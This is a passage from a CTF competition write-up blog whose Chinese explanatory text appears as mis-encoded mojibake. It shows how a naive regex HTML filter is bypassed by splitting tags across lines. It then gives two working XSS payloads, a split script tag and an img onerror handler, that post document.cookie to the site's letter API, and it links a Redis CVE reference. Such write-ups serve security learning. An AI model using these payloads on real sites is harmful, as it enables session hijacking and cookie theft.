</span></span><span style=display:flex><span>        } <span style=color:#f92672>:</span> { <span style=color:#a6e22e>title</span>: <span style=color:#66d9ef>TITLE_EMPTY</span>, <span style=color:#a6e22e>content</span>: <span style=color:#66d9ef>CONTENT_EMPTY</span> },
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>error</span>: <span style=color:#66d9ef>letter</span> <span style=color:#f92672>?</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;æ‰¾ä¸åˆ°è¯¥ä¿¡ä»¶&#39;</span>
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p>ä½†æ˜¯è¾“å…¥çš„å†…å®¹éƒ½ç»è¿‡äº† <code>safe_html</code> è¿‡æ»¤</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>safe_html</span>(<span style=color:#a6e22e>str</span>: <span style=color:#66d9ef>string</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>str</span>
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/&lt;.*&gt;/igm</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/&lt;\.*&gt;/igm</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>å¯è§è¿™åªæ˜¯ä¸€ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œæ­£åˆ™ä¸­å„ä¸ªæ ‡å¿—çš„ä½œç”¨ï¼š</p><ul><li><p><code>i</code> æ ‡å¿—ï¼šå¿½ç•¥å¤§å°å†™</p></li><li><p><code>g</code> æ ‡å¿—ï¼šå…¨å±€åŒ¹é…ï¼Œæ‰¾åˆ°æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„å†…å®¹</p></li><li><p><code>m</code> æ ‡å¿—ï¼šå¤šè¡ŒåŒ¹é…ï¼Œæ¯æ¬¡åŒ¹é…æ—¶æŒ‰è¡Œè¿›è¡ŒåŒ¹é…ï¼Œè€Œä¸æ˜¯å¯¹æ•´ä¸ªå­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…</p><p>ç”±äº <code>m</code> çš„å­˜åœ¨ï¼ŒåŒ¹é…å¼€å§‹ä¸ºè¡Œé¦–ï¼ŒåŒ¹é…ç»“æŸä¸ºè¡Œå°¾ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠ <code>&lt;</code> å’Œ <code>></code> æ”¾åœ¨ä¸åŒè¡Œå³å¯</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/api/send&#39;</span>, {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/json&#39;</span>},
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({<span style=color:#e6db74>&#39;title&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Cookie&#34;</span>, <span style=color:#e6db74>&#39;content&#39;</span><span style=color:#f92672>:</span> document.<span style=color:#a6e22e>cookie</span>})
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>è¿˜çœ‹çš„ä¸€ç§é‡ç”Ÿçš„æ–¹æ³•ï¼Œè®°å½•ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;/api/send&#34;</span>,{<span style=color:#a6e22e>method</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#39;POST&#39;</span>,<span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span>{<span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#39;application/json&#39;</span>},<span style=color:#a6e22e>body</span><span style=color:#f92672>:</span><span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({<span style=color:#e6db74>&#34;title&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;123123123&#34;</span>,<span style=color:#e6db74>&#34;content&#34;</span><span style=color:#f92672>:</span>document.<span style=color:#a6e22e>cookie</span>})});<span style=color:#75715e>//
</span></span></span></code></pre></div><p>å¤§ä½“æ˜¯ä¸€è‡´çš„æ€è·¯ï¼Œåªæ˜¯ä¸ºäº†ç»•è¿‡xssçš„é™åˆ¶</p><h3 id=ez_rediså¤ç°>ez_redis(å¤ç°)</h3><p>è¿™é¢˜è€ƒå¯Ÿæ˜¯cveï¼Œç›´æ¥æ‰”é“¾æ¥äº†ï¼Œå¥½ç´¯</p><p><a href=https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md>vulhub/redis/CVE-2022-0543/README.zh-cn.md at master Â· vulhub/vulhub (github.com)</a></p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">ç›®å½•</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>ç›®å½•</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">Ã—</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#week1>week1</a><ul><li><a href=#signin>Signin</a><ul><li><a href=#ez_answer>ez_answer</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#decompress>decompress</a></li><li><a href=#pleasingmusic>pleasingMusic</a></li><li><a href=#whereisflag>WhereIsFlag</a></li><li><a href=#labyrinth>Labyrinth</a></li><li><a href=#å…‘æ¢ç >å…‘æ¢ç </a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#xor>xor</a></li><li><a href=#base>Base</a></li><li><a href=#ä¸€çœ¼ç§’äº†>ä¸€çœ¼ç§’äº†</a></li><li><a href=#strange-king>Strange King</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#headach3>headach3</a></li><li><a href=#ä¼šèµ¢å—>ä¼šèµ¢å—</a></li><li><a href=#æ™ºæ¢°å±æœº>æ™ºæ¢°å±æœº</a></li><li><a href=#pangbai-è¿‡å®¶å®¶1>PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰</a></li><li><a href=#è°¢è°¢çš®è›‹>è°¢è°¢çš®è›‹</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#begin>begin</a></li><li><a href=#base64>base64</a></li><li><a href=#ezandroidstudy>ezAndroidStudy</a></li><li><a href=#simple_encryption>Simple_encryption</a></li><li><a href=#ez_debug>ez_debug</a></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#real-login>Real Login</a></li><li><a href=#game>Game</a></li><li><a href=#overwrite>overwrite</a></li><li><a href=#gdb>gdb</a></li></ul></li></ul></li><li><a href=#week2>week2</a><ul><li><a href=#crypto-1>Crypto</a><ul><li><a href=#è¿™æ˜¯å‡ æ¬¡æ–¹-ç–‘æƒ‘>è¿™æ˜¯å‡ æ¬¡æ–¹ï¼Ÿ ç–‘æƒ‘ï¼</a></li><li><a href=#just-one-and-more-than-two>Just one and more than two</a></li><li><a href=#since-you-konw-something>Since you konw something</a></li><li><a href=#èŒ¶é‡ŒèŒ¶æ°”>èŒ¶é‡ŒèŒ¶æ°”</a></li></ul></li><li><a href=#misc-1>Misc</a><ul><li><a href=#wireshark_checkin>wireshark_checkin</a></li><li><a href=#wireshark_secret>wireshark_secret</a></li><li><a href=#çƒ­å¿ƒåŠ©äººçš„å°æ˜åŒå­¦>çƒ­å¿ƒåŠ©äººçš„å°æ˜åŒå­¦</a></li><li><a href=#ç”¨æº¯æµä»ªè§è¯ä¼ç‰¹å°é£>ç”¨æº¯æµä»ªè§è¯ä¼ç‰¹å°é£</a></li><li><a href=#ä½ ä¹Ÿç©åŸç¥å—>ä½ ä¹Ÿç©åŸç¥å—</a></li><li><a href=#å­—é‡Œè¡Œé—´çš„ç§˜å¯†>å­—é‡Œè¡Œé—´çš„ç§˜å¯†</a></li><li><a href=#hertas-study>Herta&rsquo;s Study</a></li></ul></li><li><a href=#re-1>Re</a><ul><li><a href=#upx>UPX</a></li><li><a href=#drink_tea>drink_TEA</a></li><li><a href=#dirty_flowers>Dirty_flowers</a></li></ul></li><li><a href=#web-1>Web</a><ul><li><a href=#ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—>ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—</a></li><li><a href=#é—å¤±çš„æ‹‰é“¾>é—å¤±çš„æ‹‰é“¾</a></li><li><a href=#è°¢è°¢çš®è›‹-plus>è°¢è°¢çš®è›‹ plus</a></li><li><a href=#å¤è¯»æœº>å¤è¯»æœº</a></li><li><a href=#pangbai-è¿‡å®¶å®¶2>PangBai è¿‡å®¶å®¶ï¼ˆ2ï¼‰</a></li></ul></li><li><a href=#pwn-1>Pwn</a><ul><li><a href=#ez_game>ez_game</a></li></ul></li></ul></li><li><a href=#week3>week3</a><ul><li><a href=#web-2>Web</a><ul><li><a href=#include-me>Include Me</a></li><li><a href=#è‡­çš®è¸©è¸©èƒŒ>è‡­çš®è¸©è¸©èƒŒ</a></li><li><a href=#è‡­çš®çš„è®¡ç®—æœº>è‡­çš®çš„è®¡ç®—æœº</a></li><li><a href=#blindsql1å¤ç°>blindsql1(å¤ç°)</a></li><li><a href=#è¿™ç…§ç‰‡æ˜¯ä½ å—å¤ç°>è¿™â€œç…§ç‰‡â€æ˜¯ä½ å—(å¤ç°)</a></li></ul></li><li><a href=#re-2>Re</a><ul><li><a href=#pangbai-è¿‡å®¶å®¶3>PangBai è¿‡å®¶å®¶ï¼ˆ3ï¼‰</a></li></ul></li><li><a href=#misc-2>Misc</a><ul><li><a href=#bgmåäº†å—>BGMåäº†å—ï¼Ÿ</a></li><li><a href=#amazinggame>AmazingGame</a></li><li><a href=#osint-master>OSINT-MASTER</a></li><li><a href=#ez_jai>ez_jai</a></li></ul></li><li><a href=#crypto-2>Crypto</a><ul><li><a href=#æ•…äº‹æ–°ç¼–1>æ•…äº‹æ–°ç¼–1</a></li><li><a href=#æ•…äº‹æ–°ç¼–2>æ•…äº‹æ–°ç¼–2</a></li></ul></li></ul></li><li><a href=#week4>week4</a><ul><li><a href=#web-3>web</a><ul><li><a href=#blindsql2>blindsql2</a></li><li><a href=#chocolate>chocolate</a></li><li><a href=#ezcmssså¤ç°>ezcmsss(å¤ç°)</a></li><li><a href=#éšè—çš„å¯†ç å¤ç°>éšè—çš„å¯†ç (å¤ç°)</a></li><li><a href=#pangbai-è¿‡å®¶å®¶4å¤ç°>PangBai è¿‡å®¶å®¶ï¼ˆ4ï¼‰(å¤ç°)</a></li><li><a href=#ezpolluteå¤ç°>ezpollute(å¤ç°)</a></li></ul></li><li><a href=#misc-3>misc</a><ul><li><a href=#æ‰«ç é¢†å–flag>æ‰«ç é¢†å–flag</a></li></ul></li><li><a href=#crypto-3>crypto</a><ul><li><a href=#åœ£çŸ³åŒ•é¦–>åœ£çŸ³åŒ•é¦–</a></li><li><a href=#æ¬§æ‹‰æ¬§æ‹‰>æ¬§æ‹‰æ¬§æ‹‰ï¼ï¼</a></li></ul></li></ul></li><li><a href=#week5>week5</a><ul><li><a href=#crypto-4>crypto</a><ul><li><a href=#rsacmd5>RSAï¼Ÿcmd5ï¼</a></li><li><a href=#easy_ecc>easy_ecc</a></li><li><a href=#æ²¡eä¹Ÿèƒ½ç©>æ²¡eä¹Ÿèƒ½ç©</a></li></ul></li><li><a href=#web-4>web</a><ul><li><a href=#sqlshellå¤ç°>sqlshell(å¤ç°)</a></li><li><a href=#è‡­çš®å¹æ³¡æ³¡å¤ç°>è‡­çš®å¹æ³¡æ³¡(å¤ç°)</a></li><li><a href=#è‡­çš®çš„ç½‘ç«™å¤ç°>è‡­çš®çš„ç½‘ç«™(å¤ç°)</a></li><li><a href=#pangbai-è¿‡å®¶å®¶5å¤ç°>PangBai è¿‡å®¶å®¶ï¼ˆ5ï¼‰(å¤ç°)</a></li><li><a href=#ez_rediså¤ç°>ez_redis(å¤ç°)</a></li></ul></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/%E6%9D%82%E8%B0%88/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/><span class=title>Â«</span><br><span>2024å¹´åº¦æ€»ç»“</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/ctf/shctf2024/><span class=title>Â»</span><br><span>SHCTF2024</span></a></nav></article></main><footer class=footer><span>Â© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>Â· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>Â· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>